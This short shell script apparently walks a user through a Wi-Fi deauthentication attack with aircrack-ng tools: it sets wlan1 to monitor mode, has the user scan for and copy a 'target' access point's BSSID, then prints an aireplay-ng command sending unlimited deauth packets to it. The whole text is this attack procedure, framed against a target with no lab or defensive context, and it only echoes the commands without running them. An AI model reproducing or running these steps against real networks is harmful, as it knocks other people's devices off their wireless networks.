echo "setting your WLAN1 adaptor to monitor mode";
echo "sudo airmon-ng start wlan1";
echo "now find your target and copy his BSSID (MAC ADRESS) and then Crt+C";
echo "sudo airodump-ng wlan1";
read MAC
echo "sudo aireplay-ng -0 0 -a $MAC wlan1"
